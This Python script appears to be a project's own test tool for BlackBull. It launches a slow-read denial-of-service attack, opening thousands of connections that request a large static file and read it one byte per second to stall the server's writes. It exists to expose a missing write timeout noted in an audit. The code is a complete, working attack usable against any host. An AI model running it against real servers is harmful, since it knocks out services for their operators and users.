"""Slow-read attack: complete request, then read response 1 byte/sec.

Hits the slow-read defence gap noted in Sprint 30's peer audit —
BlackBull does NOT have a `BB_WRITE_TIMEOUT` today (planned in
Tier 1.1).  Without it, a slow-reading client holds the server's
write coroutine in `drain()` indefinitely as the kernel send buffer
fills and won't accept more bytes.

The defence is to bound the time spent in any single write/drain
operation; on exceed, close the connection.

We target a static response large enough to exceed the kernel send
buffer (typical 256 KB / 512 KB after BB_SOCKET_SNDBUF default of
262144) so the server actually blocks in drain.  `/static/app.js`
in the local sandbox is 200 KB, so we request it.

Usage:
    python3 slow_read.py \\
        --host localhost --port 8080 \\
        --connections 4096 --read-interval 1.0 --duration 30
"""
from __future__ import annotations

import argparse
import asyncio
import contextlib
import time


_REQUEST = (
    b'GET /static/app.js HTTP/1.1\r\n'
    b'Host: localhost\r\n'
    b'Accept: */*\r\n'
    b'Accept-Encoding: identity\r\n'   # ask for uncompressed (~200 KB)
    b'Connection: close\r\n'           # don't make us deal with keepalive
    b'\r\n'
)


async def _one_connection(host: str, port: int, read_interval: float,
                          deadline_at: float) -> None:
    while time.monotonic() < deadline_at:
        try:
            reader, writer = await asyncio.open_connection(host, port)
        except OSError:
            await asyncio.sleep(0.1)
            continue
        try:
            # Send request quickly — we want to be in the response-read
            # phase by the time the server starts writing.
            writer.write(_REQUEST)
            try:
                await writer.drain()
            except (ConnectionResetError, BrokenPipeError, OSError):
                continue

            # Now read the response one byte at a time, waiting between
            # reads.  Server will block in drain() trying to write more.
            while time.monotonic() < deadline_at:
                try:
                    chunk = await asyncio.wait_for(reader.read(1), timeout=2.0)
                except (asyncio.TimeoutError, ConnectionResetError, OSError):
                    break
                if not chunk:
                    break  # peer closed
                await asyncio.sleep(read_interval)
        finally:
            with contextlib.suppress(Exception):
                writer.close()
                await writer.wait_closed()


async def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument('--host', default='localhost')
    parser.add_argument('--port', type=int, default=8080)
    parser.add_argument('--connections', type=int, default=1024)
    parser.add_argument('--read-interval', type=float, default=1.0)
    parser.add_argument('--duration', type=float, default=30.0)
    args = parser.parse_args()

    deadline_at = time.monotonic() + args.duration

    print(f'>>> opening {args.connections} slow-read clients to '
          f'{args.host}:{args.port} for {args.duration}s')
    print(f'>>> read interval: {args.read_interval}s/byte')
    print(f'>>> target: /static/app.js (~200 KB body, will block drain '
          f'after kernel sndbuf saturates)')

    tasks = [
        asyncio.create_task(
            _one_connection(args.host, args.port, args.read_interval,
                            deadline_at)
        )
        for _ in range(args.connections)
    ]
    started = time.monotonic()
    try:
        await asyncio.gather(*tasks, return_exceptions=True)
    except asyncio.CancelledError:
        pass
    print(f'>>> attack ended at t+{time.monotonic() - started:.1f}s')


if __name__ == '__main__':
    try:
        import resource
        soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
        if soft < 8192:
            resource.setrlimit(resource.RLIMIT_NOFILE, (min(hard, 8192), hard))
    except (ImportError, ValueError, OSError):
        pass
    asyncio.run(main())
